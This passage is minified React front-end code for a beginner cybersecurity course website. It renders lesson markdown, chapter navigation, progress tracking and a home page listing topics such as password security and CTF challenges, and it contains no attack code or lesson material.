`)})})]},`code-${x}`)),Ee=!1):(Ee=!0,et=ae.slice(3).trim()||"text",we=[]),x++;continue}if(Ee){we.push(ae),x++;continue}if(ae.includes("<tip>")){let Y=[];for(x++;x<R.length&&!R[x].includes("</tip>");)Y.push(R[x]),x++;X.push(v.jsxs("div",{className:"tip-box",children:[v.jsxs("div",{className:"tip-box-header",children:[v.jsx(_m,{size:18}),v.jsx("span",{children:"Pro Tip"})]}),v.jsx("p",{children:Y.join(" ").replace("💡 ","")})]},`tip-${x}`)),x++;continue}if(ae.includes("<warning>")){let Y=[];for(x++;x<R.length&&!R[x].includes("</warning>");)Y.push(R[x]),x++;X.push(v.jsxs("div",{className:"warning-box",children:[v.jsxs("div",{className:"warning-box-header",children:[v.jsx(Rm,{size:18}),v.jsx("span",{children:"Warning"})]}),v.jsx("p",{children:Y.join(" ").replace("⚠️ ","")})]},`warn-${x}`)),x++;continue}if(ae.startsWith("## ")){X.push(v.jsx("h2",{children:ae.slice(3)},`h2-${x}`)),x++;continue}if(ae.startsWith("### ")){X.push(v.jsx("h3",{children:ae.slice(4)},`h3-${x}`)),x++;continue}if(ae.includes("|")&&R[x+1]?.includes("---")){const Y=ae.split("|").filter(ge=>ge.trim()).map(ge=>ge.trim());x+=2;const ze=[];for(;x<R.length&&R[x].includes("|");)ze.push(R[x].split("|").filter(ge=>ge.trim()).map(ge=>ge.trim())),x++;X.push(v.jsx("div",{style:{overflowX:"auto",margin:"20px 0"},children:v.jsxs("table",{style:{width:"100%",borderCollapse:"collapse",background:"var(--bg-card)",borderRadius:"12px",overflow:"hidden"},children:[v.jsx("thead",{children:v.jsx("tr",{children:Y.map((ge,Ht)=>v.jsx("th",{style:{padding:"12px 16px",textAlign:"left",borderBottom:"1px solid var(--border-color)",color:"var(--accent-red)"},children:ge},Ht))})}),v.jsx("tbody",{children:ze.map((ge,Ht)=>v.jsx("tr",{children:ge.map((rt,Xe)=>v.jsx("td",{style:{padding:"12px 16px",borderBottom:"1px solid var(--border-color)",color:"var(--text-secondary)"},children:v.jsx("span",{dangerouslySetInnerHTML:{__html:rt.replace(/\*\*(.*?)\*\*/g,'<strong style="color:var(--text-primary)">$1</strong>').replace(/`(.*?)`/g,'<code style="background:rgba(239,68,68,0.1);padding:2px 6px;border-radius:4px;font-size:13px">$1</code>')}})},Xe))},Ht))})]})},`table-${x}`));continue}if(ae.startsWith("- ")||ae.startsWith("* ")){const Y=[];for(;x<R.length&&(R[x].startsWith("- ")||R[x].startsWith("* "));)Y.push(R[x].slice(2)),x++;X.push(v.jsx("ul",{children:Y.map((ze,ge)=>v.jsx("li",{dangerouslySetInnerHTML:{__html:ze.replace(/\*\*(.*?)\*\*/g,"<strong>$1</strong>").replace(/`(.*?)`/g,'<code style="background:rgba(239,68,68,0.1);padding:2px 6px;border-radius:4px">$1</code>')}},ge))},`ul-${x}`));continue}if(/^\d+\. /.test(ae)){const Y=[];for(;x<R.length&&/^\d+\. /.test(R[x]);)Y.push(R[x].replace(/^\d+\. /,"")),x++;X.push(v.jsx("ol",{children:Y.map((ze,ge)=>v.jsx("li",{dangerouslySetInnerHTML:{__html:ze.replace(/\*\*(.*?)\*\*/g,"<strong>$1</strong>").replace(/`(.*?)`/g,'<code style="background:rgba(239,68,68,0.1);padding:2px 6px;border-radius:4px">$1</code>')}},ge))},`ol-${x}`));continue}ae.trim()&&X.push(v.jsx("p",{dangerouslySetInnerHTML:{__html:ae.replace(/\*\*(.*?)\*\*/g,"<strong>$1</strong>").replace(/`(.*?)`/g,'<code style="background:rgba(239,68,68,0.1);padding:2px 6px;border-radius:4px;font-family:JetBrains Mono,monospace;font-size:14px">$1</code>').replace(/\[(.*?)\]\((.*?)\)/g,'<a href="$2" target="_blank" style="color:var(--accent-cyan)">$1</a>')}},`p-${x}`)),x++}return X};return v.jsxs("div",{className:"app-container",children:[v.jsx("div",{className:"bg-grid"}),v.jsx("div",{className:"bg-noise"}),v.jsx("div",{className:"gradient-orb orb-red"}),v.jsx("div",{className:"gradient-orb orb-cyan"}),v.jsx("div",{className:"gradient-orb orb-purple"}),v.jsx("button",{className:"mobile-menu-btn",onClick:()=>L(!z),children:z?v.jsx(jm,{size:24}):v.jsx(Hm,{size:24})}),v.jsx("div",{className:`sidebar-overlay ${z?"open":""}`,onClick:()=>L(!1)}),v.jsxs("aside",{className:`sidebar ${z?"open":""}`,children:[v.jsxs("div",{className:"sidebar-header",children:[v.jsx("div",{className:"sidebar-logo",children:v.jsx(Hd,{size:24})}),v.jsx("span",{className:"sidebar-title",children:"Cybersecurity"})]}),v.jsxs("nav",{className:"sidebar-nav",children:[v.jsxs("div",{className:`nav-item ${G==="home"?"active":""}`,onClick:()=>{y("home"),L(!1)},children:[v.jsx(Em,{size:20,className:"nav-item-icon"}),v.jsx("span",{children:"Home"})]}),_t.chapters.map(H=>v.jsxs("div",{className:"nav-section",children:[v.jsxs("div",{className:"nav-section-title",children:["Ch ",H.id,": ",H.title]}),H.lessons.map(R=>v.jsxs("div",{className:`nav-item ${U?.id===R.id?"active":""}`,onClick:()=>j(R),children:[ue.includes(R.id)?v.jsx(zn,{size:18,className:"nav-item-icon",style:{color:"var(--accent-green)"}}):v.jsx(vm,{size:18,className:"nav-item-icon"}),v.jsx("span",{children:R.title})]},R.id))]},H.id))]}),v.jsxs("div",{style:{marginTop:"auto",padding:"20px",borderTop:"1px solid var(--border-color)"},children:[v.jsxs("div",{style:{display:"flex",justifyContent:"space-between",marginBottom:"8px",fontSize:"14px",color:"var(--text-secondary)"},children:[v.jsx("span",{children:"Progress"}),v.jsxs("span",{children:[P,"%"]})]}),v.jsx("div",{className:"progress-bar",children:v.jsx("div",{className:"progress-fill",style:{width:`${P}%`}})})]})]}),v.jsxs("main",{className:"main-content",children:[G==="home"&&v.jsxs(v.Fragment,{children:[v.jsxs("div",{className:"hero",children:[v.jsxs("div",{className:"hero-badge",children:[v.jsx(Hd,{size:16}),v.jsx("span",{children:"Cybersecurity Course"})]}),v.jsxs("h1",{className:"hero-title",children:["Learn",v.jsx("br",{}),v.jsx("span",{children:"Cybersecurity"})]}),v.jsx("p",{className:"hero-subtitle",children:"Understand how hackers think, protect yourself online, and start your ethical hacking journey. No experience required!"}),v.jsxs("button",{className:"nav-button primary",onClick:()=>j(_t.chapters[0].lessons[0]),style:{margin:"0 auto"},children:[v.jsx(Mm,{size:20}),"Start Learning"]})]}),v.jsxs("div",{style:{marginBottom:"48px"},children:[v.jsx("h2",{style:{fontSize:"28px",fontWeight:"700",marginBottom:"24px"},children:"Course Chapters"}),_t.chapters.map(H=>{const R=H.lessons.filter(x=>ue.includes(x.id)).length,X=Nd[H.id];return v.jsxs("div",{className:"chapter-card",onClick:()=>j(H.lessons[0]),style:{flexDirection:"column",padding:0,overflow:"hidden"},children:[X&&v.jsxs("div",{style:{width:"100%",height:"160px",overflow:"hidden",position:"relative"},children:[v.jsx("img",{src:`/cybersecurity-learning/${X.src.slice(1)}`,alt:X.alt,loading:"lazy",style:{width:"100%",height:"100%",objectFit:"cover",objectPosition:"center",transition:"transform 0.3s ease"}}),v.jsx("div",{style:{position:"absolute",bottom:0,left:0,right:0,height:"40px",background:"linear-gradient(transparent, var(--bg-card))"}})]}),v.jsxs("div",{style:{display:"flex",alignItems:"center",gap:"16px",padding:"16px 20px",width:"100%"},children:[v.jsx("div",{className:"chapter-number",children:H.id}),v.jsxs("div",{className:"chapter-info",children:[v.jsx("div",{className:"chapter-title",children:H.title}),v.jsxs("div",{className:"chapter-meta",children:[H.description," • ",H.lessons.length," lessons",R>0&&v.jsxs("span",{style:{color:"var(--accent-green)",marginLeft:"8px"},children:["(",R,"/",H.lessons.length," complete)"]})]})]}),v.jsx(Xu,{size:24,style:{color:"var(--text-muted)"}})]})]},H.id)})]}),v.jsxs("div",{className:"glass-card",style:{textAlign:"center"},children:[v.jsx("h3",{style:{marginBottom:"16px",fontSize:"20px"},children:"What You'll Learn"}),v.jsx("p",{style:{color:"var(--text-secondary)",marginBottom:"24px"},children:"By the end, you'll understand how real attacks work and how to defend against them:"}),v.jsx("div",{style:{display:"grid",gridTemplateColumns:"repeat(auto-fit, minmax(150px, 1fr))",gap:"16px"},children:["Password Security","Phishing Defense","Encryption","Network Scanning","Web Hacking","CTF Challenges"].map(H=>v.jsxs("div",{style:{padding:"16px",background:"rgba(239, 68, 68, 0.1)",borderRadius:"12px",border:"1px solid rgba(239, 68, 68, 0.2)"},children:[v.jsx(zn,{size:24,style:{color:"var(--accent-red)",marginBottom:"8px"}}),v.jsx("div",{style:{fontWeight:"500"},children:H})]},H))})]})]}),G==="lesson"&&U&&v.jsxs("div",{className:"lesson-container",children:[v.jsxs("div",{className:"lesson-header",children:[v.jsxs("div",{className:"lesson-breadcrumb",children:[v.jsx("a",{href:"#",onClick:H=>{H.preventDefault(),y("home")},children:"Home"}),v.jsx(Xu,{size:16}),v.jsx("span",{children:U.title})]}),v.jsx("h1",{className:"lesson-title",children:U.title}),v.jsxs("div",{className:"lesson-meta",children:[v.jsxs("span",{style:{display:"flex",alignItems:"center",gap:"6px"},children:[v.jsx(Tm,{size:16}),U.duration]}),ue.includes(U.id)&&v.jsxs("span",{style:{display:"flex",alignItems:"center",gap:"6px",color:"var(--accent-green)"},children:[v.jsx(zn,{size:16}),"Completed"]})]})]}),(()=>{const H=parseInt(U.id),R=Nd[H];return R?v.jsxs("div",{className:"infographic-container",children:[v.jsxs("div",{className:"infographic-badge",children:[v.jsx(Om,{size:14}),v.jsxs("span",{children:["Chapter ",H," Infographic"]})]}),v.jsx("img",{src:`/cybersecurity-learning/${R.src.slice(1)}`,alt:R.alt,className:"infographic-image",loading:"lazy",onClick:X=>X.target.classList.toggle("expanded")}),v.jsx("p",{className:"infographic-caption",children:"👆 Tap to expand"})]}):null})(),v.jsx("div",{className:"lesson-content",children:Ge(U.content)}),!ue.includes(U.id)&&v.jsxs("button",{className:"nav-button primary",style:{width:"100%",justifyContent:"center",marginTop:"32px"},onClick:()=>M(U.id),children:[v.jsx(zn,{size:20}),"Mark as Complete"]}),v.jsxs("div",{className:"lesson-nav",children:[ke()?v.jsxs("button",{className:"nav-button",onClick:()=>j(ke()),children:[v.jsx(Xu,{size:20,style:{transform:"rotate(180deg)"}}),"Previous"]}):v.jsx("div",{}),he()?v.jsxs("button",{className:"nav-button primary",onClick:()=>j(he()),children:["Next Lesson",v.jsx(Xu,{size:20})]}):v.jsxs("button",{className:"nav-button primary",onClick:()=>y("home"),children:["Finish Course",v.jsx(zn,{size:20})]})]})]})]})]})}om.createRoot(document.getElementById("root")).render(v.jsx(Dt.StrictMode,{children:v.jsx(Bm,{})}));
